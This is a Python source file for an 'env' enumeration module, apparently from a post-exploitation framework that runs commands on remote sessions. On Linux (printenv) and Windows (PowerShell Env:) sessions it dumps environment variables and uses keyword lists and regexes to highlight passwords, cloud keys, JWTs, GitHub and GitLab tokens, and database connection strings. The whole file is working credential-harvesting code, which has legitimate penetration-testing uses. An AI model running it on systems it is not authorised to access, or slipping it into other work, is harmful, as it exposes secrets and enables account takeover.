from __future__ import annotations

import re
from koi.modules.blueprint import KoiModule
from koi.utils.config import TIMEOUTS

# Substrings that make a variable name worth flagging (case-insensitive)
_SENSITIVE_KEY_PARTS = (
    "pass", "pwd", "secret", "token", "api", "auth", "cred",
    "key", "jwt", "bearer", "database", "db_", "_db", "dsn",
    "connection", "conn_", "_conn", "url", "uri",
    "aws", "azure", "gcp", "google", "github", "gitlab",
    "docker", "kube", "vault", "consul",
    "private", "encrypt", "sign", "cert", "pfx", "pem",
    "ldap", "smtp", "mail", "slack", "webhook",
)

# Regex patterns in values that are almost certainly credentials
_SENSITIVE_VALUE_RE = re.compile(
    r'(?:'
    r'(?:password|passwd|pass)\s*[:=]\s*\S+'          # password=...
    r'|[A-Z0-9]{20}[A-Z0-9/+]{30,}'                  # AWS-style long key
    r'|ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'     # JWT (eyJ...)
    r'|ghp_[A-Za-z0-9]{30,}'                          # GitHub PAT
    r'|glpat-[A-Za-z0-9_-]{20,}'                      # GitLab PAT
    r'|AIza[0-9A-Za-z_-]{35}'                         # Google API key
    r'|postgres://\S+:\S+@'                            # DB connection string
    r'|mysql://\S+:\S+@'
    r'|mongodb(?:\+srv)?://\S+:\S+@'
    r')',
    re.IGNORECASE,
)

_MAX_VAL_LEN = 120


def _is_interesting(key: str, value: str) -> bool:
    key_lower = key.lower()
    if any(part in key_lower for part in _SENSITIVE_KEY_PARTS):
        return True
    if _SENSITIVE_VALUE_RE.search(value):
        return True
    return False


class EnvDumpModule(KoiModule):
    name        = "env"
    description = "Dump environment variables and highlight credentials, tokens, and keys."
    category    = "Enumeration"
    platform    = ["linux", "windows_ps"]
    usage       = "env <id> [-a]"
    arguments   = [
        {
            "flags": ["-a", "--all"],
            "action": "store_true",
            "default": False,
            "help": "Show all variables, not just sensitive ones.",
        },
    ]

    def _display(self, env: dict[str, str], show_all: bool, total: int) -> None:
        interesting = {k: v for k, v in env.items() if _is_interesting(k, v)}
        rest        = {k: v for k, v in env.items() if k not in interesting}

        if interesting:
            self.box(
                f"Sensitive variables  ({len(interesting)} of {total})",
                interesting,
            )
        else:
            self.ok("No sensitive variables found.")

        if show_all and rest:
            self.box(f"Other variables  ({len(rest)})", rest)
        elif not show_all and rest:
            self.ok(f"{len(rest)} other variables, use -a to show all.")

    def _run_linux(self) -> None:
        with self.spinner("Dumping environment..."):
            raw = self._exec_clean("printenv 2>/dev/null || env 2>/dev/null", timeout=TIMEOUTS["exec_query"])

        env: dict[str, str] = {}
        for line in raw.splitlines():
            line = self._clean(line)
            if not line or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            if key:
                env[key] = val

        if not env:
            self.err("Failed to retrieve environment variables.")
            return

        show_all = getattr(self.args, "all", False)
        self._display(env, show_all, len(env))

    def _run_windows(self) -> None:
        ps_expr = (
            "(Get-ChildItem Env: | ForEach-Object {"
            "\"$($_.Name)|||$($_.Value)\""
            "}) -join '§'"
        )
        with self.spinner("Dumping environment..."):
            raw = self._win_query(ps_expr, timeout=TIMEOUTS["exec_query"])

        env: dict[str, str] = {}
        for entry in raw.split("§"):
            entry = self._clean(entry)
            if "|||" not in entry:
                continue
            key, _, val = entry.partition("|||")
            key = key.strip()
            if key:
                env[key] = val.strip()

        if not env:
            self.err("Failed to retrieve environment variables.")
            return

        show_all = getattr(self.args, "all", False)
        self._display(env, show_all, len(env))

    def run(self) -> None:
        if self.session.os_type == "linux":
            self._run_linux()
        else:
            self._run_windows()
